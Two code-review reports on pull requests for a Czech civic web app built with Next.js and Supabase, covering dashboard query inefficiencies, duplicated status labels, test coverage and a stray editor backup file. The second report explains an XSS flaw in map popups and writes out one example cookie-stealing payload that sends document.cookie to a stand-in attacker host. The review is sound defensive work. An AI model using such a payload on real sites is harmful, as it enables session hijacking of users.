# Quality Report — Issue #10 Re-Review (Final)

**Reviewed by:** The Squirrel (second pass — tabula rasa)
**PR:** #20 (`issue-10-pulse-dashboard` → `main`)
**Date:** 2026-03-01

---

## Status: 🟡 SUSPICIOUS NUT — Ship with caution

---

## Executive Summary

Story 1.4.2 (Pulse Dashboard) delivers what was asked: an analytics page with aggregated stats, latest reports, popular topics, and a geographic heatmap. All 75 tests pass, lint is clean. The PR itself is minimal and correct — one new test, one DEVLOG entry. However, the underlying dashboard implementation (delivered as groundwork in a prior sprint) carries three technical debt items that the Squirrel cannot ignore: duplicated status-label logic across two files, an over-fetching `select('*')`, and a double database query that fetches reports twice.

None of these are showstoppers. The story requirements are fully met. This is mergeable, but the DRY violation should be addressed before the status system grows any further.

---

## Critical Issues (Showstoppers)

None.

---

## Code Smells & Improvements

### 1. DRY Violation — Status Labels Duplicated in Two Files

`dashboard/page.tsx:174-181` uses chained ternary expressions to map status codes to Czech labels and Tailwind colour classes. `Map.tsx:215-225` solves the same problem with a `Record<string, string>` lookup object.

The same four labels (`Čeká`, `V řešení`, `Vyřešeno`, `Zamítnuto`) and similar colour classes appear in two independent locations. If a fifth status is ever added, someone will update one and forget the other.

**Fix:** Extract status labels and colours into a shared `src/lib/reportStatus.ts` constant and import it in both files.

### 2. Double Fetch of Reports (`dashboard/page.tsx:15-28`)

Reports are queried **twice** in the same server component:
- `reportsResponse` — fetches all reports (specific columns) for stats aggregation.
- `latestReportsResponse` — fetches `*` from the same table, ordered by date, limited to 5.

The "latest 5" are a strict subset of the first query's data. At current scale this is harmless, but two round-trips to the same table in a single page load is wasteful and will show up as duplicate queries in the Supabase dashboard.

### 3. `select('*')` in Latest Reports Query (`dashboard/page.tsx:22`)

The `latestReports` fetch uses `select('*')` but the UI only consumes `id`, `title`, `rating`, `category`, `status`, and `created_at`. This silently over-fetches `description`, `location`, and any future columns added to the `reports` table.

### 4. Silent Error Swallowing (`dashboard/page.tsx:30-31`)

All three Supabase responses destructure only `.data`, ignoring `.error`. A failing query produces an empty list with no indication to the user that something went wrong. A comment, a log call, or a minimal error state would make this easier to debug in production.

### 5. Hardcoded "Aktivní" System Status (`dashboard/page.tsx:121`)

The system-status card always renders the string `"Aktivní"` regardless of actual system health. This is fine for an MVP placeholder, but the field label promises something it does not deliver. Either derive a real status or rename it to something honest (e.g., "Verze", "Datum nasazení").

---

## Test Coverage Analysis

**Result: Good.** 5 tests, all passing. 75 total tests pass across the suite.

The new test (`renders Czech status labels for reports in the dashboard`) is well-structured: it seeds all four status variants and asserts the correct Czech text for each. It follows the established mock pattern and is readable.

Existing tests cover:
- Happy-path rendering with data present
- Empty state (no reports, no topics, zero stats)
- Statistics calculation (average rating, resolved count)
- Topic sort order (by comment count)
- Czech status labels (new, added in this PR)

**Gap:** No test exercises the `location.coordinates` path for the heatmap map data transformation (`mapReports` on line 46-60). A null/malformed `location` would cause an unguarded runtime crash.

---

## Verdict

Merge with the following tracked as follow-up work:

1. **Extract status labels/colours to a shared constant** — kills the DRY violation before it spawns a third copy.
2. **Consolidate the double reports fetch** — one query, derive latest-5 from the result.
3. **Fix `select('*')`** — name only the columns the UI actually reads.

The PR itself (one test + DEVLOG) is clean. The issues live in the implementation layer that landed before this PR. Flag them on the backlog and ship it.

---

# Quality Report — Issue #9 Review

**Reviewed by:** The Squirrel
**PR:** #19 (`issue-9-final-tests` → `main`)
**Date:** 2026-03-01

---

## Status: 🔴 BAD NUT — DO NOT MERGE

---

## Executive Summary

The feature work for Issue #9 is functionally solid and well-tested (69/69 tests passing). The architecture follows established patterns cleanly. However, the PR introduces an **accidental binary temp file** that must never reach `main`, and the underlying codebase (already in `main`) contains an **unmitigated XSS vulnerability** in the Map popup that was missed during prior reviews. These two issues block merge.

---

## Critical Issues (Showstoppers)

### 1. 🚨 Accidental Binary Temp File in PR (`..geminiigore.un~`)

The PR includes a binary file named `..geminiigore.un~` — a leftover undo/backup file from a text editor (likely Vim or Emacs). This was accidentally committed in `c355c1c`.

**Impact:** Pollutes the repository history permanently. Looks unprofessional. Binary blobs of unknown origin in a codebase are a liability.

**Fix:** Remove this file before merging. The `.geminiignore` file that was also added is acceptable (it's intentional), but the tilde file must go.

---

### 2. 🔒 XSS Vulnerability in `Map.tsx:230-231`

User-supplied content is interpolated directly into raw HTML without sanitization:

```typescript
// src/components/Map.tsx:230-234
<h3 class="font-bold text-zinc-900">${report.title}</h3>
<p class="text-sm text-zinc-600 mt-1">${report.description || ''}</p>
...
<span ...>${report.category || 'Bez kategorie'}</span>
```

An authenticated user can create a report with a title of `<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>` and steal session cookies from every user who opens the map. Zod validates *length* of these fields, not *content*.

This vulnerability was introduced in a prior commit and exists in `main` already. The PR should not be merged on top of a codebase with an open XSS sink. This must be fixed (escape the strings before interpolation, or use `maplibregl.Popup.setText()` / create DOM nodes manually).

---

## Code Smells & Improvements

### Minor — Shared `error` State Across All Operations (`TopicsClient.tsx:47`)

A single `error` state is shared across voting, commenting, and topic creation. A vote error will be overwritten by a concurrent comment error, or vice versa. Fine for MVP but creates confusing UX as the app grows.

### Minor — Double Supabase Query for Reports in Dashboard (`dashboard/page.tsx:15-28`)

Reports are fetched twice: once for all-time stats (`allReportsData`) and once for the latest 5 (`latestReports`). The second query is redundant — the latest 5 can be derived from the first result. At scale this is wasteful.

### Minor — `description` Schema Inconsistency (`topics/actions.ts:9`)

```typescript
description: z.string().min(10, ...).max(1000).optional(),
```

`optional()` means an empty string `""` submitted by the form will fail `min(10)`, but a missing value (`null`) passes. Since the textarea submits `""` when empty, users who type nothing get a validation error about minimum length, even though the label says "(volitelně)" — optional. Should use `.or(z.literal(''))` or `z.string().min(10).optional().or(z.literal(''))` to handle the empty-string case gracefully.

### Trivial — `select('*')` in Dashboard Latest Reports (`dashboard/page.tsx:22`)

Over-fetches all columns when only `id, title, rating, category, status` are needed for the UI.

---

## Test Coverage Analysis

**Result: Strong.** 69 tests, 13 test files, 100% passing.

- `TopicsClient.test.tsx` — Excellent coverage: optimistic voting toggle, vote switch (up→down), comment submission + form reset, error state display, unauthenticated redirect.
- `TopicForm.test.tsx` (new in this PR) — Covers happy path, error display, disabled state, close button. Appropriate for the component's scope.
- `Map.test.tsx` — Tests heatmap toggle and status badge injection.
- `actions.test.ts` — Covers toggle voting logic (insert/delete/update), `addComment` validation, auth guards.

**One gap:** No test covers the XSS escape path in Map popups (because there is no escape — this gap reveals the vulnerability).

---

## Verdict

Fix these two issues, then it's shippable:

1. **Remove `..geminiigore.un~`** from the PR branch before merging.
2. **Sanitize user content** before injecting into `setHTML()` in `Map.tsx`.

Everything else — architecture, optimistic UI, voting logic, server actions, component decomposition — is clean and production-ready.
